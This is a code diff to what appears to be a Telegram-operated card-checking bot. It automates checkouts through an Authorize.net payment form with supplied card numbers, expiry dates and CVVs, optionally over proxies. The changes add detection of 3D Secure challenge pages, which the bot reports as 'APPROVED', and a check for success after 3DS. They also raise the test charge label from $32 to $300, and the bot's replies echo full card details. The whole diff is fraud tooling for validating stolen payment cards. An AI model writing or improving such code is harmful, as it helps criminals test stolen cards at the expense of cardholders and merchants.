@@ -239,15 +239,69 @@ def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
         print("🔄 Processing payment...")
         time.sleep(8)  # Reduced from 10 to 8 seconds
         
-        # ANALYZE RESULT - GET EXACT ERROR MESSAGE
+        # 🆕 ANALYZE RESULT - CON RICONOSCIMENTO 3DS
         current_url = driver.current_url
         page_text = driver.page_source
         page_text_lower = page_text.lower()
         
         print(f"📄 Final URL: {current_url}")
         
+        # 🎯 3DS PAGE DETECTION
+        three_ds_indicators = [
+            "3dsecure", "acs.", "securecode", "verifiedbyvisa", 
+            "mastercardsecurecode", "protectbuy", "otp", "one-time",
+            "challenge", "authentication", "redirect", "bankauth",
+            "threedsecure", "3ds.", "secure3d", "cardinalcommerce",
+            "mpi.", "issuer.", "bank.", "auth."
+        ]
+        
+        # Check URL for 3DS
+        for indicator in three_ds_indicators:
+            if indicator in current_url.lower():
+                print(f"🎯 3DS URL DETECTED: {indicator}")
+                return "APPROVED - 3DS Authentication Required"
+        
+        # Check page content for 3DS
+        for indicator in three_ds_indicators:
+            if indicator in page_text_lower:
+                print(f"🎯 3DS CONTENT DETECTED: {indicator}")
+                return "APPROVED - 3DS Authentication Required"
+        
+        # Check for 3DS form elements
+        three_ds_elements = [
+            "[action*='3dsecure']",
+            "[action*='acs']",
+            "input[name*='otp']",
+            "input[name*='password']",
+            "input[name*='auth']",
+            "#otp", "#password", "#authCode", "#securityCode",
+            ".challenge-frame", ".authentication-window", ".otp-container",
+            ".3ds-frame", ".bank-auth", ".secure-code"
+        ]
+        
+        for element in three_ds_elements:
+            try:
+                elements = driver.find_elements(By.CSS_SELECTOR, element)
+                for elem in elements:
+                    if elem.is_displayed():
+                        print(f"🎯 3DS ELEMENT FOUND: {element}")
+                        return "APPROVED - 3DS Authentication Required"
+            except:
+                continue
+        
+        # 🎯 SUCCESS AFTER 3DS
+        success_after_3ds = [
+            "returnUrl", "success", "thankyou", "order-received",
+            "payment-complete", "transaction-complete", "order-confirmation",
+            "checkout/order-received", "thank-you", "success-page"
+        ]
+        
+        for indicator in success_after_3ds:
+            if indicator in current_url.lower() or indicator in page_text_lower:
+                print(f"🎯 SUCCESS AFTER 3DS: {indicator}")
+                return "APPROVED - Payment Successful (3DS Completed)"
+        
         # STRATEGY 1: EXTRACT EXACT ERROR MESSAGES FROM AUTHORIZE.NET
-        # Common Authorize.net error message patterns
         authnet_error_patterns = [
             r'this transaction has been declined',
             r'your card was declined',
@@ -299,48 +353,7 @@ def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
             except:
                 continue
         
-        # STRATEGY 3: EXTRACT FROM COMMON ERROR MESSAGE STRUCTURES
-        # Look for common error message structures
-        common_error_phrases = [
-            "has been declined",
-            "was declined", 
-            "cannot be processed",
-            "could not be processed",
-            "payment failed",
-            "transaction failed",
-            "not authorized",
-            "invalid card",
-            "expired card"
-        ]
-        
-        # Search page text for these phrases with context
-        for phrase in common_error_phrases:
-            if phrase in page_text_lower:
-                # Extract the full sentence containing the phrase
-                try:
-                    # Find the phrase in text
-                    index = page_text_lower.find(phrase)
-                    if index != -1:
-                        # Extract context around the phrase
-                        start = max(0, index - 50)
-                        end = min(len(page_text), index + len(phrase) + 50)
-                        context = page_text[start:end]
-                        
-                        # Clean HTML tags and extract readable text
-                        clean_text = re.sub('<[^<]+?>', '', context)
-                        clean_text = ' '.join(clean_text.split())
-                        
-                        # Find the most meaningful part (usually contains the error)
-                        sentences = re.split(r'[.!?]', clean_text)
-                        for sentence in sentences:
-                            if phrase in sentence.lower() and len(sentence) > 20:
-                                exact_error = sentence.strip()
-                                print(f"🔴 EXTRACTED ERROR: '{exact_error}'")
-                                return "DECLINED", exact_error
-                except:
-                    pass
-        
-        # STRATEGY 4: CHECK IF STILL ON REGISTRATION PAGE WITH ERRORS
+        # STRATEGY 3: CHECK IF STILL ON REGISTRATION PAGE WITH ERRORS
         if "register" in current_url:
             # Look for any validation errors
             validation_errors = [
@@ -357,7 +370,7 @@ def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
             
             return "DECLINED", "Payment failed - Still on registration page"
         
-        # STRATEGY 5: CHECK FOR SUCCESS
+        # STRATEGY 4: CHECK FOR SUCCESS
         success_indicators = [
             "my-account", "dashboard", "thank you", "welcome",
             "account created", "payment successful", "transaction complete"
@@ -457,19 +470,19 @@ async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = f"""Approved ✅
 
 Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: authnet $32
+Gateway: AUTHNET $300
 Response: {message}"""
         elif status == "DECLINED":
             response = f"""Declined ❌
 
 Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: authnet $32
+Gateway: AUTHNET $300
 Response: {message}"""
         else:
             response = f"""Error ⚠️
 
 Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: authnet $32
+Gateway: AUTHNET $300
 Response: {message}"""
         
         # ADD BIN INFO IF AVAILABLE
